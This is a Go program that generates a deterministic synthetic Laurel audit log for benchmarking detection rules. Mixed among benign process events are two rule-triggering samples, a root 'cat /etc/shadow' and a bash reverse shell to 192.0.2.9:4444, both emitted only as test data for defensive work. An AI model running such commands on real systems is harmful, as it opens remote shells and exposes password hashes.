// Command genlog writes a synthetic Laurel JSON audit log to stdout: a
// stream of mostly-benign process events with a small, fixed fraction that
// trip rules, for end-to-end performance measurement (see `just bench-e2e`).
// It is deterministic for a given -n so hyperfine runs are comparable, and
// it carries no real host data -- every value is made up.
package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
)

func main() {
	n := flag.Int("n", 100000, "number of events to emit")
	flag.Parse()

	// A pool of benign events and a few that match the shipped rules, mixed so
	// roughly 1 in 100 lines is a hit -- a realistic signal-to-noise ratio.
	benign := []string{
		`{"ID":"%d.000:%d","SYSCALL":{"exe":"/usr/bin/ls","uid":"1000","comm":"ls"},"EXECVE":{"argc":"2","ARGV":["ls","-la"]},"CWD":{"cwd":"/home/u"},"UID":{"1000":"u"}}`,
		`{"ID":"%d.000:%d","SYSCALL":{"exe":"/usr/bin/python3","uid":"1000","comm":"python3"},"EXECVE":{"argc":"3","ARGV":["python3","-c","print(1)"]},"CWD":{"cwd":"/home/u"},"UID":{"1000":"u"}}`,
		`{"ID":"%d.000:%d","SYSCALL":{"exe":"/usr/bin/git","uid":"1000","comm":"git"},"EXECVE":{"argc":"2","ARGV":["git","status"]},"CWD":{"cwd":"/home/u/src"},"UID":{"1000":"u"}}`,
		`{"ID":"%d.000:%d","SYSCALL":{"exe":"/bin/cp","uid":"0","comm":"cp"},"EXECVE":{"argc":"3","ARGV":["cp","a","b"]},"CWD":{"cwd":"/tmp"},"UID":{"0":"root"}}`,
	}
	hits := []string{
		`{"ID":"%d.000:%d","SYSCALL":{"exe":"/usr/bin/cat","uid":"0","comm":"cat"},"EXECVE":{"argc":"2","ARGV":["cat","/etc/shadow"]},"CWD":{"cwd":"/root"},"PATH":[{"item":"0","name":"/etc/shadow","nametype":"NORMAL"}],"UID":{"0":"root"}}`,
		`{"ID":"%d.000:%d","SYSCALL":{"exe":"/bin/bash","uid":"0","comm":"bash"},"EXECVE":{"argc":"3","ARGV":["bash","-c","bash -i >& /dev/tcp/192.0.2.9/4444 0>&1"]},"CWD":{"cwd":"/root"},"UID":{"0":"root"}}`,
	}

	// Deterministic index-cycling (no PRNG needed): reproducible for a given
	// -n, and roughly 1 in 100 events is a rule hit.
	w := bufio.NewWriter(os.Stdout)
	for i := 0; i < *n; i++ {
		var line string
		if i%100 == 0 {
			line = hits[(i/100)%len(hits)]
		} else {
			line = benign[i%len(benign)]
		}
		if _, err := fmt.Fprintf(w, line+"\n", 1700000000+i, 1000+i); err != nil {
			fmt.Fprintln(os.Stderr, "genlog:", err)
			os.Exit(1)
		}
	}
	if err := w.Flush(); err != nil {
		fmt.Fprintln(os.Stderr, "genlog:", err)
		os.Exit(1)
	}
}
